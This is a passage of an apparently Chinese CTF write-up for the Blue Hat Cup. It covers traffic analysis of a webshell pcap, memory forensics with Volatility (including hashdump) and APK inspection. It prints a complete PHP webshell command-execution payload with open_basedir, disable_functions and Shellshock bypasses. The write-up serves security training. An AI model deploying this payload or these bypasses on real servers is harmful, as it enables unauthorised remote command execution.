class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">	<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">	@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.c46a89a&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">		<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		;</span><br><span class="line">		@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;79c2&quot;</span>.<span class="string">&quot;0b92&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;b4e7e&quot;</span>.<span class="string">&quot;465b62&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">		@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">		<span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">				@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">			<span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				<span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">				<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">					<span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> False;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">			@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">				<span class="keyword">return</span> True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> False;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">		<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">			@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">			@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">			<span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">			<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">			<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">			<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">			<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line">			<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">			<span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;yee092cda97a62&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;q8fb9d4c082c11&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;p48a6d55fac1b1&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p>分析代码可知，base64截取两位后字符进行解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r domainhacker.pcapng -Y <span class="string">&#x27;http.request.method ==&quot;POST&quot;&#x27;</span> -T json -e urlencoded-form.value &gt; Tao.txt</span><br><span class="line"><span class="built_in">cat</span> Tao.txt | jq <span class="string">&#x27;.[]._source.layers.&quot;urlencoded-form.value&quot;[2]&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;&quot;&#x27;</span> -f 2 | sed <span class="string">&#x27;s/..//&#x27;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203001224.png" alt="image-20220709203001224"></p>
+<p>发现1.rar和一个密码，正好和前面请求下载压缩包对应了，导出http对象</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203759107.png" alt="image-20220709203759107"></p>
+<p>导出发现<code>1.rar</code>，输入上面压缩的密码即可解压缩获得flag</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709203846543.png" alt="image-20220709203846543"></p>
+<h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><h3 id="1-手机取证1"><a href="#1-手机取证1" class="headerlink" title="1. 手机取证1"></a>1. 手机取证1</h3><p>搜索<code>3022159.PNG</code></p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205130243.png" alt="image-20220709205130243"></p>
+<p>可以直接看到分辨率360x360</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205121443.png" alt="image-20220709205121443"></p>
+<h3 id="2-手机取证2"><a href="#2-手机取证2" class="headerlink" title="2. 手机取证2"></a>2. 手机取证2</h3><p>搜索姜总关键字</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205115357.png" alt="image-20220709205115357"></p>
+<p>在群组聊天里找到快递单号</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205108371.png" alt="image-20220709205108371"></p>
+<h3 id="3-计算机取证1"><a href="#3-计算机取证1" class="headerlink" title="3. 计算机取证1"></a>3. 计算机取证1</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp imageinfo</code></p>
+<p>系统版本为Win7SP1x64</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205102750.png" alt="image-20220709205102750"></p>
+<p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 hashdump</code></p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205056605.png" alt="image-20220709205056605"></p>
+<p>拿到<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 网站解密得到taqi7的开机密码</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205049358.png" alt="image-20220709205049358"></p>
+<h3 id="4-计算机取证2"><a href="#4-计算机取证2" class="headerlink" title="4. 计算机取证2"></a>4. 计算机取证2</h3><p><code>volatility_2.6_win64_standalone.exe -f 1.dmp --profile=Win7SP1x64 cmdline</code></p>
+<p>pid为2192的运行了MagnetRAMCapture.exe</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205035986.png" alt="image-20220709205035986"></p>
+<p>这是一款制作内存镜像的工具</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205029581.png" alt="image-20220709205029581"></p>
+<h3 id="5-程序分析-1"><a href="#5-程序分析-1" class="headerlink" title="5. 程序分析_1"></a>5. 程序分析_1</h3><p>将apk包反编译后，打开<code>AndroidManifest.xml</code>，搜索package获取包名</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205014408.png" alt="image-20220709205014408"></p>
+<h3 id="6-程序分析-2"><a href="#6-程序分析-2" class="headerlink" title="6. 程序分析_2"></a>6. 程序分析_2</h3><p>查找android.intent.action.MAIN和android.intent.category.LAUNCHER对应的activity，该activity对应的android:name属性即为入口</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709205008184.png" alt="image-20220709205008184"></p>
+<h3 id="7-程序分析-3"><a href="#7-程序分析-3" class="headerlink" title="7. 程序分析_3"></a>7. 程序分析_3</h3><p>.找到MainActivity<br> <img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204948195.png" alt="image-20220709204948195"></p>
+<p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6进行base64解码</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/clip_image003.png" alt="img"></p>
+<h3 id="8-网站取证-1"><a href="#8-网站取证-1" class="headerlink" title="8. 网站取证_1"></a>8. 网站取证_1</h3><p>使用火绒查杀找到网站后门</p>
